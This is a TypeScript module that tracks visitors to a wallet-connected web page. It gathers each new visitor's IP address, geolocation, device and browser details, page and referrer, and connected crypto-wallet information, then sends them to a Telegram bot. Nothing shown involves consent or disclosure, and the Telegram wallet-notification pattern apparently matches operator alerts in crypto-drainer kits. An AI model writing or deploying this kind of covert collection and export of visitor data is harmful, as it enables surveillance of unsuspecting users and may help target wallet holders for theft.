import { StorageManager } from './storage';
import { sendToTelegram } from './telegram';
import { 
  DATA_COLLECTION_CONFIG, USER_INFO_CONFIG, 
  UserInfoConfigOptions, DataCollectionConfigOptions, 
  TelegramConfigOptions, 
  getDataCollectionConfig, getUserInfoConfig 
} from '../config';
import { UserInfo, WalletInfo } from '../types/userInfo';

/**
 * Interface for tracking configuration options
 */
export interface TrackingOptions {
  telegramConfig?: Partial<TelegramConfigOptions>;
  userInfoConfig?: UserInfoConfigOptions;
  dataConfig?: DataCollectionConfigOptions;
}

/**
 * Initializes user tracking and sends data if appropriate
 * @param walletInfo - Information about the user's connected wallet
 * @param options - Optional configuration overrides
 * @returns Promise that resolves when tracking is complete
 */
export async function initializeUserTracking(
  walletInfo: WalletInfo,
  options?: TrackingOptions
): Promise<void> {
  // Apply custom configurations or use defaults
  const dataConfig = options?.dataConfig ? 
    getDataCollectionConfig(options.dataConfig) : 
    DATA_COLLECTION_CONFIG;
  
  if (StorageManager.shouldNotifyNewVisit()) {
    if (dataConfig.DEBUG_ENABLED) {
      console.debug('New visit detected - collecting user information...');
    }
    
    try {
      const userInfo = await getUserInfo(walletInfo, options);
      
      // Send to telegram bot with custom configuration if provided
      const messageSent = await sendToTelegram(userInfo, options?.telegramConfig);
      
      if (messageSent) {
        StorageManager.setVisitTimestamp();
        if (dataConfig.DEBUG_ENABLED) {
          console.debug('Visit recorded and notification sent');
        }
      }
    } catch (error) {
      console.error('Error processing new visit:', error);
    }
  } else if (dataConfig.DEBUG_ENABLED) {
    console.debug('Recent visit detected - skipping notification');
  }
}

/**
 * Collects comprehensive information about the current user and their device
 * @param walletInfo - Information about the user's connected wallet
 * @param options - Optional configuration overrides
 * @returns Promise resolving to complete UserInfo object
 */
async function getUserInfo(
  walletInfo: WalletInfo,
  options?: TrackingOptions
): Promise<UserInfo> {
  // Apply custom configurations or use defaults
  const userConfig = options?.userInfoConfig ? 
    getUserInfoConfig(options.userInfoConfig) : 
    USER_INFO_CONFIG;
    
  const dataConfig = options?.dataConfig ? 
    getDataCollectionConfig(options.dataConfig) : 
    DATA_COLLECTION_CONFIG;

  // Convert timeout to number if it's a string - define outside try/catch for error handling scope
  const apiTimeoutMs = typeof userConfig.API_TIMEOUT_MS === 'string' ? 
    parseInt(userConfig.API_TIMEOUT_MS, 10) : 
    userConfig.API_TIMEOUT_MS;

  try {
    
    // Set up request with timeout for IP API
    const ipController = new AbortController();
    const ipTimeoutId = setTimeout(() => ipController.abort(), apiTimeoutMs);
    
    // Get IP address using the configured API endpoint
    const ipResponse = await fetch(userConfig.IP_API_URL, {
      signal: ipController.signal
    });
    clearTimeout(ipTimeoutId);
    
    if (!ipResponse.ok) {
      throw new Error(`IP API response error: ${ipResponse.status} ${ipResponse.statusText}`);
    }
    
    const { ip } = await ipResponse.json();

    // Set up request with timeout for geolocation API
    const geoController = new AbortController();
    const geoTimeoutId = setTimeout(() => geoController.abort(), apiTimeoutMs);
    
    // Get location information using the configured geolocation API
    const locationResponse = await fetch(`${userConfig.GEO_API_URL}/${ip}/json/`, {
      signal: geoController.signal
    });
    clearTimeout(geoTimeoutId);
    
    if (!locationResponse.ok) {
      throw new Error(`Geolocation API response error: ${locationResponse.status} ${locationResponse.statusText}`);
    }
    
    const locationData = await locationResponse.json();

    // Detect device type
    const userAgent = navigator.userAgent;
    const isMobile = /Mobile|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(userAgent);
    const isTablet = /Tablet|iPad/i.test(userAgent);
    const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';

    // Get browser and OS info
    const browser = detectBrowser();
    const os = detectOS();

    // Calculate time on page - getting page load time if available
    const timeOnPage = typeof performance !== 'undefined' && performance.now ? 
      Math.round(performance.now() / 1000) : undefined;

    // Build complete user info object
    return {
      ip,
      websiteInfo: {
        url: window.location.origin + window.location.pathname,
        title: document.title,
        referrer: document.referrer || 'Direct',
        timeOnPage
      },
      location: dataConfig.COLLECT_LOCATION_INFO ? {
        city: locationData.city,
        country: locationData.country_name,
        region: locationData.region
      } : {},
      device: dataConfig.COLLECT_DEVICE_INFO ? {
        type: deviceType,
        browser,
        os,
        userAgent
      } : {
        type: deviceType,
        browser: 'Unknown',
        os: 'Unknown',
        userAgent: 'Redacted'
      },
      wallet: walletInfo // Use the wallet info passed from the component
    };
  } catch (error: unknown) {
    // Handle errors with available configuration options
    if (error instanceof DOMException && error.name === 'AbortError') {
      console.error('API request timed out while collecting user information');
      if (dataConfig.DEBUG_ENABLED) {
        console.debug('Request timeout details:', { timeout: apiTimeoutMs });
      }
    } else if (error instanceof Error) {
      console.error('Error collecting user information:', error.message);
      if (dataConfig.DEBUG_ENABLED) {
        console.debug('Error details:', { name: error.name });
      }
    } else {
      console.error('Unknown error collecting user information');
    }
    
    // Return partial information when there's an error
    return {
      ip: 'unknown',
      websiteInfo: {
        url: window.location.origin + window.location.pathname,
        title: document.title,
        referrer: document.referrer || 'Direct'
      },
      location: {},
      device: {
        type: 'Desktop',
        browser: 'Unknown',
        os: 'Unknown',
        userAgent: dataConfig.DEBUG_ENABLED ? navigator.userAgent : 'Redacted'
      },
      wallet: walletInfo
    };
  }
}

/**
 * Detects the browser name from the user agent string
 * @returns Browser name string
 */
function detectBrowser(): string {
  const ua = navigator.userAgent;
  
  // Check for Edge first as it contains Chrome and Safari strings
  if (ua.includes("Edg") || ua.includes("Edge")) return "Edge";
  
  // Check for other browsers
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  
  return "Unknown";
}

/**
 * Detects operating system from the user agent string
 * @returns Operating system name string
 */
function detectOS(): string {
  const ua = navigator.userAgent;
  
  // Check for mobile operating systems first
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) return "iOS";
  
  // Check for desktop operating systems
  if (ua.includes("Win")) return "Windows";
  if (ua.includes("Mac OS")) return "macOS";
  if (ua.includes("Linux")) return "Linux";
  if (ua.includes("X11")) return "Unix";
  
  return "Unknown";
}